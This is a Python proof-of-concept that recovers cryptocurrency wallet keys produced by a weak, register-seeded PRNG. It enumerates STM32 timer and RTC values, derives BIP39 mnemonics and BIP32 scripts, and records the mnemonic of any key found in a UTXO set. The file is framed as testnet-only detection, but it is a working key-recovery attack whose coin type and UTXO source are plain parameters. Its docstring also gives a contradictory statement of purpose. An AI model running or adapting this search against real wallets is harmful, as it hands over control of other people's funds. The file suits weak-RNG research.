#!/usr/bin/env python3
"""btc_wallet_seed_gen.py — weak-RNG (yamagata) key-recovery PoC over the TESTNET UTXO set.

Reproduces a device whose "randomness" is the yamagata PRNG (prng.py) seeded from
predictable STM32 timer/RTC registers, then run through BIP39 -> BIP32 to make keys:

    pad = uid ^ SysTick->VAL      n = RTC->TR (h:m:s)      d = RTC->SSR (sub-second)

The search enumerates a *constrained* seed space, derives each candidate's
scriptPubKeys, and tests them for membership in the testnet UTXO set (bloom filter
from utxo_filter.py, confirmed against the exact set). A membership hit means that
regenerated key controls a real testnet output — i.e. the RNG is broken.

SCOPE: DETECTION ONLY. It logs hits (with the mnemonic, so a finding
can be reproduced on the device). It never builds, signs, or broadcasts a
transaction and has no capability to move funds.

PURPOSE: create a wallet key for testnet purpose that we know for sure that no one is already using.
This is a demonstration purpose, so the seed and the RNG is not based on true randomness.
However, the output should be a true wallet key because we'll demonstrate the use in a class,
even if we will test on testnet.

Because a *miss* is ambiguous (a valid key that was simply never funded looks the
same as a wrong PRNG model), validate the pipeline before trusting a null result:
  * btc_derive.selftest() gates startup on published BIP39/BIP32/BIP84/BIP86 vectors.
  * `--check "uid,tick,tr,ssr=<scriptpubkey-hex>"` closes the loop end-to-end: fund a
    key generated on the real device, then confirm this harness rederives its script.
Only then does sweeping the UTXO set and finding nothing actually mean something.

Usage:
    # closed-loop sanity check against a device-generated, funded testnet script
    # (tr may be a raw register int or a wall-clock HH:MM:SS):
    ./btc_wallet_seed_gen.py --check "0x1234,0,12:00:00,128=0014a1b2...c3"

    # the real search over a constrained register space (registers are modelled
    # as their real STM32 encodings — TR is BCD h:m:s, SSR is 0..PREDIV_S):
    ./btc_wallet_seed_gen.py --scripts snapshot/scripts.csv --uids 100 \\
        --systick 0..65535 --tr 12:00:00..13:00:00 --ssr 0..255 \\
        --scripts-types p2wpkh,p2tr --gap 20
"""

# This pyenv Python's OpenSSL lacks blake2, so hashlib logs a harmless one-time
# "unsupported hash type blake2b/blake2s" traceback the first time it's imported.
# We never use blake2 — swallow that single ERROR log by importing hashlib once
# with error logging disabled; all later logging (and imports) behave normally.
import logging as _logging

_logging.disable(_logging.ERROR)
import hashlib as _hashlib  # noqa: E402,F401  (quiet the one-time blake2 import log)

_logging.disable(_logging.NOTSET)

import argparse  # noqa: E402
import math  # noqa: E402
import os  # noqa: E402
import sys  # noqa: E402
import time  # noqa: E402

import yamagat_prng as yam  # noqa: E402
import btc_derive as btc
from stm32_uids import generate_stm32_uid
from utxo_filter import BloomFilter, iter_scripts

MASK32 = 0xFFFFFFFF
MASK8 = 0xFF

# --- device-specific packing assumptions (adjust to the real firmware) --------
# yamagata emits 32-bit words; how they pack into BIP39 entropy is a firmware
# detail, surfaced here so a wrong guess is visible rather than silent.
DEFAULT_ENTROPY_BYTES = 16  # 16 -> 12-word mnemonic, 32 -> 24-word
DEFAULT_ENDIAN = "big"
DEFAULT_COIN = 1  # BIP44 coin type: testnet = 1'


# ==========================================================================
# yamagata PRNG driver
# ==========================================================================
def yamagata_seed(pad, n, d, dat=0):
    """Load the three register-derived ingredients into the PRNG state."""
    yam.yamagata_pad = pad & MASK32
    yam.yamagata_n = n & MASK32
    yam.yamagata_d = d & MASK32
    yam.yamagata_dat = dat & MASK8


def yamagata_entropy(nbytes, endian):
    out = bytearray()
    while len(out) < nbytes:
        out += yam.my_yamagata().to_bytes(4, endian)
    return bytes(out[:nbytes])


def prng(pad_seed, tr, ssr, nbytes, endian):
    """The pseudo-code's prng(uid ^ tick, tr, ssr): seed, then fill entropy."""
    yamagata_seed(pad_seed, tr, ssr)
    return yamagata_entropy(nbytes, endian)


# ==========================================================================
# derivation: entropy -> mnemonic -> BIP32 -> scriptPubKeys
# ==========================================================================
def derive_scripts(entropy, script_types, coin, accounts, gap):
    """Return (mnemonic, [(script_type, path, scriptPubKey_bytes), ...])."""
    mnemonic = btc.entropy_to_mnemonic(entropy)
    seed = btc.mnemonic_to_seed(mnemonic)  # PBKDF2 x2048 — done once per seed
    out = []
    for st in script_types:
        builder, purpose = btc.SCRIPT_FUNCS[st]
        for acct in accounts:
            for i in range(gap):
                path = f"m/{purpose}/{coin}'/{acct}'/0/{i}"
                k = btc.derive_priv(seed, btc.parse_path(path))
                out.append((st, path, builder(k)))
    return mnemonic, out


# ==========================================================================
# candidate-space parsing
# ==========================================================================
def _read_ints(path):
    with open(path) as fh:
        for line in fh:
            line = line.split("#", 1)[0].strip()
            if line:
                yield int(line, 0)


def parse_dim(spec):
    """'a' | 'a,b,c' | 'a..b' | 'a..b..step' | '@file'  (values via int(x, 0))."""
    spec = spec.strip()
    if spec.startswith("@"):
        return list(_read_ints(spec[1:]))
    if ".." in spec:
        parts = spec.split("..")
        a, b = int(parts[0], 0), int(parts[1], 0)
        step = int(parts[2], 0) if len(parts) > 2 else 1
        return range(a, b + 1, step)  # inclusive upper bound
    if "," in spec:
        return [int(x, 0) for x in spec.split(",")]
    return [int(spec, 0)]


def space_size(dims):
    total = 1
    for d in dims:
        total *= len(d)
    return total


# ==========================================================================
# STM32 register modelling — proper systick / RTC-TR / RTC-SSR candidates
# ==========================================================================
# The three PRNG ingredients are raw hardware-register contents, so the loops
# must iterate the values those registers can actually hold, not arbitrary ints.
SYSTICK_BITS = 24  # SysTick SYST_CVR is a 24-bit down-counter


def _bounds(dim):
    """(min, max) of a range/list without iterating a huge range."""
    if isinstance(dim, range):
        if len(dim) == 0:
            return (0, 0)
        a, b = dim[0], dim[len(dim) - 1]
        return (min(a, b), max(a, b))
    return (min(dim), max(dim)) if dim else (0, 0)


def rtc_tr(h, m, s):
    """Pack h:m:s into the STM32 RTC_TR register layout (24-hour mode, PM=0).

    Fields per the reference manual: HT[21:20] HU[19:16] MNT[14:12] MNU[11:8]
    ST[6:4] SU[3:0], each a BCD digit. This is the value firmware reads from
    RTC->TR — e.g. 12:00:00 is 0x120000, NOT decimal 43200.
    """
    return (
        ((h // 10) << 20)
        | ((h % 10) << 16)
        | ((m // 10) << 12)
        | ((m % 10) << 8)
        | ((s // 10) << 4)
        | (s % 10)
    )


def rtc_tr_decode(reg):
    """Inverse of rtc_tr: register value -> (h, m, s)."""
    h = ((reg >> 20) & 0xF) * 10 + ((reg >> 16) & 0xF)
    m = ((reg >> 12) & 0xF) * 10 + ((reg >> 8) & 0xF)
    s = ((reg >> 4) & 0xF) * 10 + (reg & 0xF)
    return h, m, s


def _parse_hms(tok):
    h, m, s = (int(x) for x in tok.split(":"))
    if not (0 <= h < 24 and 0 <= m < 60 and 0 <= s < 60):
        raise ValueError(f"bad time {tok!r} (expected HH:MM:SS)")
    return h * 3600 + m * 60 + s


def parse_systick(spec, reload_):
    """SysTick->VAL candidates: raw 24-bit down-counter values.

    Normal dim spec, plus 'full' -> 0..reload. Warns if values exceed the
    24-bit register width or the configured reload.
    """
    dim = range(0, reload_ + 1) if spec.strip() in ("full", "*") else parse_dim(spec)
    _, hi = _bounds(dim)
    if hi > (1 << SYSTICK_BITS) - 1:
        print(
            f"  [warn] systick 0x{hi:x} exceeds 24-bit SysTick width", file=sys.stderr
        )
    elif hi > reload_:
        print(f"  [warn] systick max {hi} exceeds reload {reload_}", file=sys.stderr)
    return dim


def parse_tr(spec):
    """RTC->TR candidates.

    Time mode (a ':' is present): walk a wall-clock window and emit BCD-packed
    RTC_TR register values — what firmware actually reads.
        'HH:MM:SS'                        single instant
        'HH:MM:SS..HH:MM:SS[..step_s]'    inclusive window, step in seconds
                                          (wraps past midnight if end < start)
    Raw mode (no ':'): an ordinary dim spec of already-encoded register ints.
    """
    spec = spec.strip()
    if ":" not in spec:
        return parse_dim(spec)
    parts = spec.split("..")
    start = _parse_hms(parts[0])
    if len(parts) == 1:
        secs = [start]
    else:
        end = _parse_hms(parts[1])
        step = int(parts[2]) if len(parts) > 2 else 1
        if end < start:
            end += 24 * 3600  # wrap past midnight
        secs = range(start, end + 1, step)
    out = []
    for t in secs:
        h, rem = divmod(t % (24 * 3600), 3600)
        m, s = divmod(rem, 60)
        out.append(rtc_tr(h, m, s))
    return out


def parse_ssr(spec, prediv_s):
    """RTC->SSR candidates: sub-second down-counter, 0..PREDIV_S.

    Normal dim spec, plus 'full' -> 0..PREDIV_S. Warns past PREDIV_S.
    """
    dim = range(0, prediv_s + 1) if spec.strip() in ("full", "*") else parse_dim(spec)
    _, hi = _bounds(dim)
    if hi > prediv_s:
        print(
            f"  [warn] ssr max {hi} exceeds PREDIV_S {prediv_s} "
            f"(register only counts 0..{prediv_s})",
            file=sys.stderr,
        )
    return dim


# ==========================================================================
# UTXO set membership
# ==========================================================================
def default_cache_path(scripts_path):
    return scripts_path + ".bloom.npz"


def get_bloom(path, column, fpr, cache_path, rebuild):
    """Return a bloom filter over the *entire* UTXO CSV, without an exact set.

    First run streams the whole CSV once to build the filter, then caches it to
    `cache_path`; later runs reload that (~m/8 bytes) and never touch the multi-GB
    CSV. Bloom hits during the search are logged, not confirmed here — confirm the
    handful of logged candidates against the CSV separately (confirm_hits.py).
    """
    if cache_path and os.path.exists(cache_path) and not rebuild:
        print(f"  loading cached bloom from {cache_path} ...")
        bloom = BloomFilter.load(cache_path)
        print(
            f"  cached bloom: n={bloom.n:,} distinct-ish, k={bloom.k}, "
            f"~{human(bloom.nbytes)} (fpr ignored; baked into cache — "
            f"--rebuild-bloom to rebuild)"
        )
        return bloom

    # Pass 1: count elements so the filter can be sized (m = n * bits/elem).
    print(f"  [build] pass 1/2: counting scripts in {path} ...")
    counters = {}
    n = sum(1 for _ in iter_scripts(path, column, counters=counters))
    if not n:
        sys.exit(f"no scripts parsed from {path}")
    if counters.get("skipped"):
        print(f"  [warn] skipped {counters['skipped']:,} unparseable rows (not in set)")
    bpe = math.log2(1 / fpr) / math.log(2)  # 1.44 * log2(1/fpr)
    print(
        f"  {n:,} scripts; bloom @ fpr~{fpr:g} = {bpe:.1f} bits/elem "
        f"(~{human(int(n * bpe / 8))})"
    )

    # Pass 2: stream the CSV again, building the filter in constant memory.
    print(f"  [build] pass 2/2: building bloom (streaming) ...")
    bloom = BloomFilter(n, bpe)
    t0 = time.time()

    def progress(seen):
        rate = seen / max(time.time() - t0, 1e-9)
        print(f"    hashed {seen:,}/{n:,} ({rate:,.0f}/s)", file=sys.stderr)

    bloom.build_stream(iter_scripts(path, column), progress=progress)
    if cache_path:
        bloom.save(cache_path)
        print(f"  cached bloom -> {cache_path} (reused on the next run)")
    return bloom


def human(nbytes):
    for unit in ("B", "KiB", "MiB", "GiB", "TiB"):
        if nbytes < 1024 or unit == "TiB":
            return f"{nbytes:,.1f} {unit}"
        nbytes /= 1024


# ==========================================================================
# closed-loop check: does one known (uid,tick,tr,ssr) rederive an expected spk?
# ==========================================================================
def run_check(spec, cfg):
    lhs, _, rhs = spec.partition("=")
    if not rhs:
        sys.exit("--check needs 'uid,tick,tr,ssr=<scriptpubkey-hex>'")
    uid_s, tick_s, tr_s, ssr_s = lhs.split(",")
    uid, tick, ssr = int(uid_s, 0), int(tick_s, 0), int(ssr_s, 0)
    # tr accepts either a raw register int or a wall-clock HH:MM:SS (BCD-encoded)
    tr = parse_tr(tr_s)[0] if ":" in tr_s else int(tr_s, 0)
    expect = bytes.fromhex(rhs.strip().lower().removeprefix("0x"))
    ent = prng(uid ^ tick, tr, ssr, cfg.entropy_bytes, cfg.endian)
    mnemonic, scripts = derive_scripts(
        ent, cfg.script_types, cfg.coin, cfg.accounts, cfg.gap
    )
    print(f"\n  entropy : {ent.hex()}")
    print(f"  mnemonic: {mnemonic}")
    print(f"  derived {len(scripts)} scripts; searching for {expect.hex()}")
    for st, path, spk in scripts:
        if spk == expect:
            print(f"\n  MATCH  {st:7} {path}  {spk.hex()}")
            print("  closed-loop OK: PRNG + derivation reproduce the device key.")
            return 0
    print("\n  NO MATCH in the derived scripts. Check entropy-bytes/endian, the")
    print("  script types, the gap limit, or the register values themselves.")
    for st, path, spk in scripts[:8]:
        print(f"    {st:7} {path}  {spk.hex()}")
    return 1


# ==========================================================================
# the search
# ==========================================================================
def run_search(bloom, uids, systicks, trs, ssrs, cfg):
    dims = (uids, systicks, trs, ssrs)
    total_seeds = space_size(dims)
    if cfg.limit:
        total_seeds = min(total_seeds, cfg.limit)
    print(
        f"\n  searching {total_seeds:,} seeds "
        f"(uids={len(uids):,} x systick={len(systicks):,} x tr={len(trs):,} "
        f"x ssr={len(ssrs):,}), {cfg.gap} addr/account x "
        f"{len(cfg.accounts)} acct x {len(cfg.script_types)} type"
    )
    print(
        f"  bloom candidates -> {cfg.hits} "
        f"(confirm against the CSV with: confirm_hits.py {cfg.hits} <scripts.csv>)\n"
    )
    candidates = misses = seeds = 0
    t0 = time.time()
    with open(cfg.hits, "a") as hitf:
        hitf.write(f"# search started {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        for uid in uids:
            for tick in systicks:
                for tr in trs:
                    for ssr in ssrs:
                        if cfg.limit and seeds >= cfg.limit:
                            return _report(candidates, misses, seeds, t0, cfg.hits)
                        ent = prng(uid ^ tick, tr, ssr, cfg.entropy_bytes, cfg.endian)
                        mnemonic, scripts = derive_scripts(
                            ent, cfg.script_types, cfg.coin, cfg.accounts, cfg.gap
                        )
                        if seeds < cfg.preview_seeds:  # show first N regardless of hit
                            th, tm, ts = rtc_tr_decode(tr)
                            print(
                                f"  [seed {seeds}] uid=0x{uid:x} systick={tick} "
                                f"tr=0x{tr:06x} ({th:02d}:{tm:02d}:{ts:02d}) ssr={ssr}\n"
                                f"             {mnemonic}"
                            )
                        elif seeds == cfg.preview_seeds:
                            print(
                                f"  [note] first {cfg.preview_seeds} seeds shown above; "
                                f"later seeds only logged if they hit the bloom filter."
                            )
                        spks = [s for _, _, s in scripts]
                        maybe = bloom.contains(spks)  # vectorized membership test
                        for (st, path, spk), hit in zip(scripts, maybe):
                            if hit:  # bloom candidate — log, confirm separately
                                candidates += 1
                                _log_candidate(
                                    hitf, uid, tick, tr, ssr, mnemonic, st, path, spk
                                )
                            else:
                                misses += 1
                        seeds += 1
                        if seeds % 500 == 0:
                            rate = seeds / max(time.time() - t0, 1e-9)
                            print(
                                f"    {seeds:,}/{total_seeds:,} seeds "
                                f"({rate:,.0f}/s)  candidates={candidates}",
                                file=sys.stderr,
                            )
    return _report(candidates, misses, seeds, t0, cfg.hits)


def _log_candidate(hitf, uid, tick, tr, ssr, mnemonic, st, path, spk):
    """Append a bloom-candidate line (confirm later against the CSV)."""
    th, tm, ts = rtc_tr_decode(tr)
    line = (
        f"spk={spk.hex()} type={st} path={path} "
        f"uid=0x{uid:x} systick={tick} tr=0x{tr:06x} "
        f'time={th:02d}:{tm:02d}:{ts:02d} ssr={ssr} mnemonic="{mnemonic}"'
    )
    hitf.write(line + "\n")
    hitf.flush()  # durable even if a long run is interrupted
    print(f"\n  *** BLOOM CANDIDATE (unconfirmed) ***\n      {line}")


def _report(candidates, misses, seeds, t0, hits_path):
    dt = time.time() - t0
    print(f"\n  {'='*58}")
    print(f"  done: {seeds:,} seeds in {dt:.1f}s ({seeds/max(dt,1e-9):,.0f}/s)")
    print(f"  bloom candidates={candidates}  misses={misses:,}")
    if candidates == 0:
        print("  no bloom candidates — REMEMBER a null result only means something")
        print(
            "  once the pipeline is validated (--check) and the register space is right."
        )
    else:
        print(f"  candidates written to {hits_path}; confirm the real ones with:")
        print(f"    ./confirm_hits.py {hits_path} <scripts.csv>")
    print(f"  {'='*58}\n")
    return 0


# ==========================================================================
# CLI
# ==========================================================================
def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    ap.add_argument("--scripts", metavar="CSV", help="parsed testnet UTXO CSV")
    ap.add_argument("--column", default="script", help="script-hex column name")
    ap.add_argument("--fpr", type=float, default=1e-6, help="bloom target FPR")
    ap.add_argument(
        "--uids",
        type=int,
        default=1,
        help="how many times to repeat the search (randomized uids)",
    )

    # ap.add_argument("--uids", default="0..9", help="device UIDs (dim spec)")
    ap.add_argument(
        "--systick",
        default="1..2",
        help="SysTick->VAL: raw 24-bit dim spec, or 'full' for 0..reload",
    )
    ap.add_argument(
        "--systick-reload",
        type=lambda x: int(x, 0),
        default=(1 << SYSTICK_BITS) - 1,
        help="SysTick reload bounding 'full'/warnings (default 0xffffff)",
    )
    ap.add_argument(
        "--tr",
        default="18:00:00..18:01:00",
        help="RTC->TR: 'HH:MM:SS[..HH:MM:SS[..step_s]]' (BCD-encoded), or raw ints",
    )
    ap.add_argument(
        "--ssr",
        default="0..255",
        help="RTC->SSR sub-second dim spec (0..PREDIV_S), or 'full'",
    )
    ap.add_argument(
        "--ssr-prediv",
        type=int,
        default=255,
        help="RTC PREDIV_S: SSR down-counter top (default 255)",
    )
    ap.add_argument(
        "--limit",
        type=int,
        help="hard cap on search loops (seeds) tried; the CSV is always read in full",
    )
    ap.add_argument(
        "--preview-seeds",
        type=int,
        default=10,
        help="print uid/registers + mnemonic for the first N seeds (hit or miss)",
    )

    ap.add_argument(
        "--scripts-types", default="p2wpkh", help="comma list of: p2wpkh,p2pkh,p2tr"
    )
    ap.add_argument("--accounts", default="0", help="account indices (dim spec)")
    ap.add_argument(
        "--gap", type=int, default=1, help="addresses 0..gap-1 checked per account"
    )
    ap.add_argument(
        "--entropy-bytes",
        type=int,
        default=DEFAULT_ENTROPY_BYTES,
        choices=(16, 20, 24, 28, 32),
    )
    ap.add_argument(
        "--endian",
        default=DEFAULT_ENDIAN,
        choices=("big", "little"),
        help="byte order packing yamagata words into entropy",
    )
    ap.add_argument(
        "--coin", type=int, default=DEFAULT_COIN, help="BIP44 coin type (testnet=1)"
    )

    ap.add_argument(
        "--bloom-cache",
        metavar="NPZ",
        help="path to persist/reload the bloom (default <scripts>.bloom.npz); "
        "built once from the CSV, reused on later runs",
    )
    ap.add_argument(
        "--rebuild-bloom",
        action="store_true",
        help="ignore any cached bloom and rebuild it from the CSV",
    )
    ap.add_argument(
        "--hits",
        default="hits.txt",
        help="append bloom candidates here; confirm with confirm_hits.py "
        "(default hits.txt)",
    )

    ap.add_argument(
        "--check",
        metavar="SPEC",
        help="closed-loop: 'uid,tick,tr,ssr=<scriptpubkey-hex>'",
    )
    args = ap.parse_args()

    # derivation must be provably correct before any result is meaningful
    btc.selftest()
    print("  [check] BIP39/secp256k1/BIP32/BIP84/BIP86 vectors: OK")

    args.script_types = [s.strip() for s in args.scripts_types.split(",") if s.strip()]
    for st in args.script_types:
        if st not in btc.SCRIPT_FUNCS:
            sys.exit(
                f"unknown script type {st!r}; choose from {list(btc.SCRIPT_FUNCS)}"
            )
    args.accounts = list(parse_dim(args.accounts))
    print(
        f"  [note] entropy={args.entropy_bytes}B endian={args.endian} "
        f"coin={args.coin}' types={args.script_types} — device-specific, verify."
    )

    if args.check:
        sys.exit(run_check(args.check, args))

    if not args.scripts:
        sys.exit("--scripts CSV is required for a search (or use --check)")

    # uids = list(parse_dim(args.uids))
    uids = list()
    for i in range(args.uids):
        uids.append(
            generate_stm32_uid()["uid_words"][0]
        )  # just the first word, the "UID" in the PRNG seed

    cache_path = args.bloom_cache or default_cache_path(args.scripts)
    bloom = get_bloom(
        args.scripts, args.column, args.fpr, cache_path, args.rebuild_bloom
    )
    systicks = parse_systick(args.systick, args.systick_reload)
    trs = parse_tr(args.tr)
    ssrs = parse_ssr(args.ssr, args.ssr_prediv)
    sys.exit(run_search(bloom, uids, systicks, trs, ssrs, args))


if __name__ == "__main__":
    main()
